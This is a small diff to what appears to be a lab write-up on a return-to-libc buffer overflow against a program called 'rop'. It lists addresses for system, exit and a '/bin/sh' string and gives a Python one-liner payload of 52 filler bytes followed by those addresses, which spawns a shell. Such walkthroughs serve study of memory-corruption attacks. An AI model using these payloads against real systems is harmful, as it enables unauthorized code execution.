@@ -324,8 +324,8 @@ Exit: 0xb7e479d0 => \xd0\x79\xe4\xb7
 /bin/sh: 0xb7f74a0b => \x0b\x4a\xf7\xb7  
 
 
-The final payload to the rop program:
-$(python -c 'print("A"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x0b\x4a\xf7\xb7")')  
+The final payload to the rop program:  
+./rop $(python -c 'print("A"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x0b\x4a\xf7\xb7")')  
 <p align="center">
 <img width="538" alt="40" src="https://user-images.githubusercontent.com/21021400/144066140-dabc3037-14aa-449a-829d-cc99e3f7cb24.png">
 </p>
